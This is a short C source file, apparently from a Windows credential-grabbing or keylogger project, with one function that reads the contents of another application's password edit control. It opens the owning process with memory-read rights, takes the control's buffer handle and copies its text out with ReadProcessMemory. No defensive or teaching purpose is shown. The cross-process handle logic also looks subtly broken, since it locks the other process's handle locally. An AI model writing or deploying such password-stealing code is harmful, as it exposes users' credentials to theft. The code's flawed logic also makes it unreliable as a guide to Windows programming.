#include "../../../winkey.h"

int read_password_from_control(HWND hEdit, char *out, size_t out_size)
{
	DWORD pid = 0;
	GetWindowThreadProcessId(hEdit, &pid);
	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (!hProc)
		return 0;
	HANDLE hMem = (HANDLE)SendMessage(hEdit, EM_GETHANDLE, 0, 0);
	if (!hMem)
	{
		CloseHandle(hProc);
		return 0;
	}
	LPVOID pText = LocalLock(hMem);
	if (!pText)
	{
		CloseHandle(hProc);
		return 0;
	}
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(hProc, pText, out, out_size - 1, &bytesRead))
	{
		LocalUnlock(hMem);
		CloseHandle(hProc);
		return 0;
	}
	out[bytesRead] = '\0';
	LocalUnlock(hMem);
	CloseHandle(hProc);
	return 1;
}
